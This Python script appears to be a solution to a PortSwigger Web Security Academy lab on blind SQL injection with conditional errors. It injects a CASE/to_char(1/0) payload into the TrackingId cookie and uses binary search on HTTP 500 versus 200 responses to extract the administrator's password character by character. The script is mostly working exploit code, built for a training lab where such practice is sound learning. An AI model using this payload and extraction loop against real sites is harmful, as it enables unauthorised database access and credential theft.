"""
My python based solution to the sql injection challenge for Web Security Academy lab
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

it uses binary search to find the password much faster
"""
import requests
from pprint import pprint 
import string
import random


alpha_num = string.digits + string.ascii_lowercase # alphanumeric chars used in db sorted in ascending order
len_alpha_num = len(alpha_num)
no_of_requests = 0

host ='https://aca31ff01fbb6d4d80d94d17006c003b.web-security-academy.net/'
cookie_tracking_id ='PrmU0xNBXrjqAE0I'
cookie_session ='FuCmsjHPwOJ1iPde8IGUzqeOjgNoSwi3'
raw_headers = """
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="93", " Not;A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
"""


def ParseRawHeaders(text):
	header_array = text.split('\n')[1:-1] # splits each separate header into an array
	header_arr = map(lambda x: x.split(': '), header_array)
	header_dict = {key:value for key, value in header_arr}
	print('Header:')
	pprint(header_dict)
	return header_dict

site_headers = ParseRawHeaders(raw_headers)


def GetMiddle(a, b):
	return int((a + b) / 2)

def BinarySearchPassword(start, end, index, CheckPass, debug):
	"""
	Searches the databes for the correct password using the binary search algorithm.
	at the beginning the start index is 0, and the end index is 0. these represent the index of the character currently being searched
	"index" represents the position of the character currently being searched in the password. for example if your on the 4th character and the password is 'asfnbsdfkj' the index will represent char 'n'
	CheckPass is a function used to check if the current char in the passowrd is > than the char at the middle index - the algorithm works based on that result

	as far as I know, binary search is of log(N) complexity...... sooo its prettyyyyyy fast - at least far better than going through all permutations in burp haha
	https://en.wikipedia.org/wiki/Binary_search_algorithm 
	"""
	if debug:
		print(f'index: {index}, end: {end}, start: {start}')

	middle = GetMiddle(start, end)

	# case 1 - when there are only 2 items e.g [ 'a', 'b']
	if end - start == 1:
		if CheckPass(index, middle, debug) : # we would could use "start" instead here, but middle == start in this case anyways
			return end
		else:
			return start
	# case 2 - if the two indexes are the same, they are the answer
	if end == start:
		return start
	
	if CheckPass(index, middle, debug):
		# if the middle char > than the last, make the start char the index of middle char + 1
		return BinarySearchPassword(middle + 1, end, index, CheckPass, debug)
	else:
		# if the middle char not >, make the last char the middle char
		return BinarySearchPassword(start, middle, index, CheckPass, debug)

def CheckPass(pass_index, search_index, debug):
	"""
	 CheckPass returns true is the server returns a 500 error, which means the error condition resulted in "true"
	"""
	global no_of_requests
	no_of_requests += 1

	if debug:
		print(f"..CheckPass at index {pass_index} > {alpha_num[search_index]} ?..")

	# inject the sql query into the tracking id. The sql query goes something like this ==> tracking-id='3af.....xyx' AND (SELECT CASE WHEN (username='administrator' AND SUBSTR(password, 11, 1) > 'h') THEN to_char(1/0) ELSE 'A' END FROM users WHERE ROWNUM=1)='A"
	# this should give and error on the server if the condition is true
	tracking_id = cookie_tracking_id + f"' AND (SELECT CASE WHEN (username='administrator' AND SUBSTR(password, {pass_index}, 1) >'{alpha_num[search_index]}') THEN to_char(1/0) ELSE 'A' END FROM users WHERE ROWNUM=1)='A"
	site_cookies = {'TrackingId': tracking_id, 'session': cookie_session}

	if pass_index == 0 and search_index == 0:
		print(f'\nCookies: {site_cookies}\n')

	response = requests.get(host, headers=site_headers, cookies=site_cookies)
	status_code = response.status_code

	if status_code == 500:
		if debug:
			print('true')
		return True

	elif status_code == 200 :
		if debug:
			print('false')
		return False
	
	else:
		print(response.text)
		print(response.headers)
		print()
		raise 'Unexpected server error'



def Test():
	len_test_pass = 28
	test_password =''.join(random.choices(alpha_num, k=len_test_pass))
	solved_password = ''

	def TestCheckPass(pass_index, search_index, debug):
		print(f"..CheckPass: {test_password[pass_index]} > {alpha_num[search_index]}..")
		if test_password[pass_index] > alpha_num[search_index]:
			print('true')
			return True
		else:
			print('false')
			return False

	print('Starting test...')
	print(f'The real password is {test_password}...')
	print(f'alphanum: {alpha_num}, len_alpha: {len_alpha_num}')

	Solve(range(len_test_pass), solved_password, TestCheckPass, test_password)

def TestConnection():
	site_cookies = {'TrackingId': cookie_tracking_id, 'session': cookie_session}
	response = requests.get(host, headers=site_headers, cookies=site_cookies)
	status_code = response.status_code

	return status_code == 200


def Solve(password_arr, solved_password, CheckPass, test_password='', debug=False):
	ll = len(password_arr)
	# for i in range(len_password):
	for i in password_arr:
		print(f'Solving at index {i}.....')

		start = 0
		end = len_alpha_num - 1

		pass_char_at_index = BinarySearchPassword(start, end, i, CheckPass, debug)

		print(f'Solved char index: {pass_char_at_index} ==> {alpha_num[pass_char_at_index]}\n')
		solved_password += alpha_num[pass_char_at_index]

	print(f'Finished...')
	print(f'made {no_of_requests} requests to server out of the possible 720')
	print('Solved Password'.ljust(ll, '_') + '|| ' + 'Real Password'.ljust(ll, '_'))
	print(f'{solved_password}'.ljust(ll) + '|| ' + f'{test_password}'.ljust(ll))
	if test_password:
		print(f'Solved?? {solved_password == test_password}')

def Main():
	len_pass = 20 # i determined this manually with another SQL injection
	solved_password = ''
	db_index_arr = range(1,21)

	print('Starting...')
	print('Testing connection..')
	ans = 'ok' if TestConnection else 'bad' 
	print(f'Connection {ans}' )
	print(f'alphanumeric set: {alpha_num}\nNo. of possible chars: {len_alpha_num}\nPassword length: {len_pass}\n')

	Solve(db_index_arr, solved_password, CheckPass)


if __name__ == "__main__":
	Main()
	# Test()